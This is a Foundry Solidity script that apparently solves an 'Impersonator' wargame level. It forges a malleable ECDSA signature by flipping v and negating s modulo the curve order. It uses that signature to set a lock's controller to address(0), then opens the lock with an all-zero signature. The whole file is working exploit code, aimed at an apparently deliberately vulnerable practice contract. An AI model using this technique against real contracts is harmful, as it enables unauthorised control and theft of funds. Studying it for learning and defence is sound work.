// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/Impersonator.sol";
import "forge-std/Script.sol";

contract ImpersonatorSol is Script {
    Impersonator public ips_ = Impersonator(0x375130383aa5423b08b77d3C9902Dc3f5c4dCE34);
    ECLocker public ecl_ = ECLocker(0x7b0F032BbaDE6732115aDF82Fd497402F684abe4);
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function run() external {
        vm.startBroadcast();

        bytes32 v;
        bytes32 r;
        bytes32 s;
        bytes memory sig = hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";
        assembly {
            r := mload(add(sig, 0x20))
            s := mload(add(sig, 0x40))
            v := mload(add(sig, 0x60))
        }

        uint8 _v = uint256(v) == 27 ? 28 : 27;
        bytes32 _r = r;
        bytes32 _s = bytes32(N - uint256(s));
        ecl_.changeController(_v, _r, _s, address(0));
        ecl_.open(uint8(0), bytes32(0), bytes32(0));

        vm.stopBroadcast();
    }
}